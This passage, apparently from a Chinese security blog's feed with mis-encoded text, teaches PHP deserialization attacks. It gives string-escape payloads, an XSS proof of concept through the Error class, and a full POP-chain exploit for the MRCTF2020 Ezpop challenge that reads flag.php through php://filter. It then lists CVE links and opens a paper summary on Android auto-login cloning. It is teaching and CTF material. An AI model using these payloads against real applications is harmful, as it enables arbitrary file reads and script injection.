æ˜¯æŠŠååºåˆ—åŒ–åçš„ä¸€ä¸ªxæ›¿æ¢æˆä¸ºä¸¤ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;æ­¤æ—¶ï¼Œage=<span class="subst">$new</span>[1]&quot;</span>;</span><br></pre></td></tr></table></figure><p>æ­£å¸¸æƒ…å†µ,ä¼ å…¥<code>name=mao</code><br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-1.png"><br>å¦‚æœæ­¤æ—¶å¤šä¼ å…¥ä¸€ä¸ªxçš„è¯ä¼šæ€æ ·ï¼Œæ¯«æ— ç–‘é—®ååºåˆ—åŒ–å¤±è´¥ï¼Œç”±äºæº¢å‡º(sæœ¬æ¥æ˜¯4ç»“æœå¤šäº†ä¸€ä¸ªå­—ç¬¦å‡ºæ¥)ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å®ç°å­—ç¬¦ä¸²é€ƒé€¸<br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-2.png"><br>æ¥ä¸‹æ¥æˆ‘ä»¬ä¼ å…¥ï¼š<code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>ï¼Œ<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>ï¼Œè¿™ä¸€éƒ¨åˆ†å…±20ä¸ªå­—ç¬¦ï¼Œç”±äºä¸€ä¸ªxä¼šè¢«æ›¿æ¢ä¸ºä¸¤ä¸ªï¼Œæˆ‘ä»¬è¾“å…¥äº†ä¸€å…±20ä¸ªxï¼Œç°åœ¨æ˜¯40ä¸ªï¼Œå¤šå‡ºæ¥çš„20ä¸ªxå…¶å®å–ä»£äº†æˆ‘ä»¬çš„è¿™äºŒåä¸ªå­—ç¬¦ï¼Œé€ æˆæº¢å‡ºï¼Œè€Œè¾“å‡ºäº†<code>woaini</code>ã€‚<br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-3.png"></p><p>æƒ…å†µäºŒï¼šè¿‡æ»¤åå­—ç¬¦ä¸²å˜å°‘<br>è¿™æ¬¡æ˜¯æŠŠä¸¤ä¸ªxæ›¿æ¢ä¸º1ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;æ­¤æ—¶ï¼Œage=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new</span>[<span class="string">&#x27;age&#x27;</span>];</span><br></pre></td></tr></table></figure><p>æ­£å¸¸æƒ…å†µä¼ å…¥<code>name=mao&amp;age=11</code>çš„ç»“æœ<br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-4.png"><br>æ„é€ payloadï¼Œç”±äºå‰é¢æ˜¯40ä¸ªxæ‰€ä»¥å¯¼è‡´å°‘äº†20ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦åé¢æ¥è¡¥ä¸Šï¼Œ<code>&quot;;s:3:&quot;age&quot;;s:28:&quot;11</code>è¿™ä¸€éƒ¨åˆ†åˆšå¥½20ä¸ªï¼Œåé¢çš„<code>&quot;</code>é—­åˆäº†å‰é¢çš„å‚æ•°ï¼Œå°±å¯ä»¥å®ç°è‡ªå®šä¹‰æ‰§è¡Œäº†ã€‚<br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-5.png"></p><h2 id="PHPåŸç”Ÿç±»ååºåˆ—åŒ–åˆ©ç”¨"><a href="#PHPåŸç”Ÿç±»ååºåˆ—åŒ–åˆ©ç”¨" class="headerlink" title="PHPåŸç”Ÿç±»ååºåˆ—åŒ–åˆ©ç”¨"></a><a href="https://blog.csdn.net/qq_53287512/article/details/123879744">PHPåŸç”Ÿç±»ååºåˆ—åŒ–åˆ©ç”¨</a></h2><p>PHPåŸç”Ÿç±»ä¸­å­˜åœ¨å¾ˆå¤šé­”æœ¯æ–¹æ³•çš„ä½¿ç”¨ï¼Œå¯ä»¥åˆ©ç”¨è¿™äº›åŸç”Ÿç±»æ„é€ POPé“¾ã€‚<br>å¯ä»¥ç”¨ä¸‹é¢çš„è„šæœ¬æ¥æŸ¥çœ‹åŸç”Ÿç±»ä¸­å“ªäº›æ–¹æ³•å¯ä»¥è¢«è°ƒç”¨   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªç®€å•çš„å°ä¾‹å­çœ‹ä¸‹å¦‚ä½•åˆ©ç”¨ã€‚æœ‰å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>æ„é€ POCå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥å®ç°xssï¼Œè™½ç„¶åŸæ¥çš„ä»£ç ä¸­æ²¡æœ‰ä»€ä¹ˆç±»å¯ä»¥åˆ©ç”¨ï¼Œä½†åˆ©ç”¨åŸç”Ÿç±»å¯ä»¥å®ç°</p><h2 id="CTFé¢˜ç›®"><a href="#CTFé¢˜ç›®" class="headerlink" title="CTFé¢˜ç›®"></a>CTFé¢˜ç›®</h2><p><a href="https://blog.csdn.net/jayq1/article/details/131858372">CTFä¸­çš„ååºåˆ—åŒ–</a></p><h3 id="ã€ŒMRCTF2020ã€-Ezpop"><a href="#ã€ŒMRCTF2020ã€-Ezpop" class="headerlink" title="ã€ŒMRCTF2020ã€- Ezpop"></a>ã€ŒMRCTF2020ã€- Ezpop</h3><p>æ‰“å¼€é¡µé¢åå‡ºç°ä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æƒ³è®©ä¸Šé¢çš„ä»£ç æ˜¾ç¤ºå‡ºflagï¼Œå¯ä»¥æ³¨æ„åˆ°Modifierä¸­çš„includeï¼Œè¿™ä¸ªå¯ä»¥åˆ©ç”¨PHPæ–‡ä»¶åŒ…å«æ¼æ´å®ç°ï¼Œä½†æ˜¯è¦æ€ä¹ˆæ‰èƒ½æ‰§è¡Œå‘¢ï¼Œç»§ç»­å¾€ä¸‹çœ‹<br>é¢˜ç›®ä¸­æœ‰å¾ˆå¤šçš„é­”æœ¯æ–¹æ³•ï¼Œä»å¯æ§çš„å…¥å£å‡ºå‘ä¸€ä¸€æ€»ç»“åœ¨ä¸‹é¢</p><ul><li>@unserialize åœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ __wakeup æ–¹æ³•ï¼Œåˆ¤æ–­Showç±»åº”å½“æ˜¯å…¥å£</li><li>_wakeup ä¸­ æœ‰ <code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)</code>ï¼Œè¿™é‡Œå°† <code>$this-&gt;source</code> å½“åšå­—ç¬¦ä¸²å¤„ç†ä¼šè§¦å‘ __toString æ–¹æ³•</li><li>__toString æ–¹æ³•ä¸­ï¼Œè®¿é—®å±æ€§source <code>$this-&gt;str-&gt;source</code> ï¼Œå¦‚æœsourceä¸å­˜åœ¨å°±ä¼šè°ƒç”¨ <code>__get</code> ï¼Œæ‰€ä»¥è¿™é‡Œçš„ $this-&gt;str åº”å½“ä¸º Test ç±»</li><li>__get æ–¹æ³•ä¸­ï¼Œè°ƒç”¨ <code>$function()</code> ï¼Œè¿™é‡Œ p åº”å½“ä¸º Modifier ç±»ï¼Œå°†ç±»å½“åšå‡½æ•°è°ƒç”¨ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ __invoke æ–¹æ³•</li></ul><p>æ˜ç™½äº†POPé“¾çš„æ„é€ ï¼Œå°±å¯ä»¥åˆ©ç”¨ä¼ªåè®®æ„é€ å‡ºä¸‹é¢çš„payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;karsa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payloadåï¼Œè®¿é—®<code>?pop=</code>ï¼Œå³å¯å¾—åˆ°flagã€‚<br>æ³¨* ä½¿ç”¨ â€œphp:&#x2F;&#x2F;filterâ€ä¼ªåè®®â€ æ¥è¿›è¡ŒåŒ…å«ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp:&#x2F;&#x2F;filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œé˜»æ­¢å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><h2 id="å®æˆ˜æ¼æ´åˆ†æ"><a href="#å®æˆ˜æ¼æ´åˆ†æ" class="headerlink" title="å®æˆ˜æ¼æ´åˆ†æ"></a>å®æˆ˜æ¼æ´åˆ†æ</h2><h3 id="Laravel-RCEï¼ˆCVE-2021-3129"><a href="#Laravel-RCEï¼ˆCVE-2021-3129" class="headerlink" title="Laravel RCEï¼ˆCVE-2021-3129"></a>Laravel RCEï¼ˆCVE-2021-3129</h3><p><a href="https://www.freebuf.com/vuls/280508.html">https://www.freebuf.com/vuls/280508.html</a></p><h3 id="Laravel-v11-x-CVE-2024-40075"><a href="#Laravel-v11-x-CVE-2024-40075" class="headerlink" title="Laravel v11.x (CVE-2024-40075)"></a>Laravel v11.x (CVE-2024-40075)</h3><p><a href="https://xz.aliyun.com/t/15127?time__1311=GqjxuQD=omwxlxGgx+xCqiKbn7wG8U3feD">https://xz.aliyun.com/t/15127?time__1311=GqjxuQD%3DomwxlxGgx%2BxCqiKbn7wG8U3feD</a></p><h3 id="CVE-2020-15148-Yii2"><a href="#CVE-2020-15148-Yii2" class="headerlink" title="CVE-2020-15148 Yii2"></a>CVE-2020-15148 Yii2</h3><p><a href="https://www.cnblogs.com/Aurora-M/p/15659232.html">https://www.cnblogs.com/Aurora-M/p/15659232.html</a></p><h3 id="CVE-2018-18753-Typecho"><a href="#CVE-2018-18753-Typecho" class="headerlink" title="CVE-2018-18753 Typecho"></a>CVE-2018-18753 Typecho</h3><p><a href="https://www.cnblogs.com/wuhongbin/p/15526142.html">https://www.cnblogs.com/wuhongbin/p/15526142.html</a></p><h3 id="CVE-2019-6340"><a href="#CVE-2019-6340" class="headerlink" title="CVE-2019-6340"></a>CVE-2019-6340</h3><p><a href="https://blog.csdn.net/shelter1234567/article/details/135187595">https://blog.csdn.net/shelter1234567/article/details/135187595</a></p><h3 id="phpBB-Phar-CVE-2018-19274"><a href="#phpBB-Phar-CVE-2018-19274" class="headerlink" title="phpBB Phar CVE-2018-19274"></a>phpBB Phar CVE-2018-19274</h3><p><a href="https://xz.aliyun.com/t/8239">https://xz.aliyun.com/t/8239</a></p><h3 id="CVE-2022-30287-Horde-Webmail"><a href="#CVE-2022-30287-Horde-Webmail" class="headerlink" title="CVE-2022-30287 Horde Webmail"></a>CVE-2022-30287 Horde Webmail</h3><p><a href="https://www.ctfiot.com/45607.html">https://www.ctfiot.com/45607.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ–æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è®ºæ–‡ç²¾è¯»ã€‘Appâ€™s Auto-Login Function Security Testing via Android OS-Level Virtualization</title>
      <link href="/2024/09/10/PaperReading/Auto-Login/"/>
      <url>/2024/09/10/PaperReading/Auto-Login/</url>
      
        <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>æœ¬æ–‡ç ”ç©¶çš„é—®é¢˜æ˜¯APPè´¦å·è‡ªåŠ¨ç™»å½•ï¼Œé¦–å…ˆåˆšçœ‹åˆ°é¢˜ç›®æˆ‘ä»¥ä¸ºæ˜¯é‚£ç§æ‰‹æœºä¸Šéƒ½ä¼šæœ‰è‡ªåŠ¨è¾“å…¥è´¦å·å¯†ç çš„æœºåˆ¶ï¼Œè¯»äº†æ–‡ç« ä¹‹åäº†è§£åˆ°è¿™é‡Œè¯´çš„è‡ªåŠ¨ç™»å½•æ˜¯ç™»å½•çŠ¶æ€çš„ä¿æŒï¼Œæ¯”å¦‚å¾®ä¿¡ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨åˆšä¸‹è½½å¾®ä¿¡æ—¶è¾“å…¥è´¦å·å¯†ç è¿›è¡Œç™»å½•ï¼Œä¹‹åæ¯æ¬¡å³ä¾¿æ˜¯å…³æ‰å¾®ä¿¡è¿›ç¨‹ï¼Œä¹Ÿæ˜¯ä¸€æ‰“å¼€å°±æ˜¯è‡ªåŠ¨ç™»å½•çš„ï¼Œè¿™ä¹Ÿå°±çœå»äº†ç”¨æˆ·é¢‘ç¹è¾“å…¥è´¦å·å’Œå£ä»¤çš„éº»çƒ¦ã€‚ç„¶è€Œï¼Œåœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œå®ƒæ˜“å—åˆ°â€œdata-clone attackâ€çš„å¨èƒï¼š å¦‚æœè‡ªåŠ¨ç™»å½•ä¾èµ–çš„æ•°æ®å­˜å‚¨åœ¨æœ¬åœ°ï¼Œå®ƒå¯èƒ½ä¼šè¢«æ”»å‡»è€…å…‹éš†ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥çªç 